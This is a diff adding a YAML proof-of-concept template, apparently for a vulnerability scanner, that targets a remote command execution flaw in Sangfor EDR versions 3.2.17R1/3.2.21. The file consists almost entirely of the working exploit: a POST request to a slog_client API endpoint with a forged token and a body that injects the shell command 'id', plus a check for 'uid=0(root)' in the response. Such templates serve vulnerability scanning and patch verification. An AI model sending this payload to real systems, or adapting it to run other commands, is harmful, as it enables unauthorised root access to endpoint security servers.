@@ -1,0 +1,20 @@
+detail:
+  Affected Version: Sangfor EDR 3.2.17R1/3.2.21
+  author: x1n9Qi8
+  links:
+  - https://www.cnblogs.com/0day-li/p/13650452.html
+expression: r0()
+manual: true
+name: poc-yaml-sangfor-edr-cssp-rce
+rules:
+  r0:
+    expression: response.status == 200 && response.content_type.contains("json") &&
+      response.body.bcontains(b"uid=0(root)")
+    request:
+      body: '{"params":"w=123\"''1234123''\"|id"}'
+      cache: true
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      method: POST
+      path: /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9
+transport: http
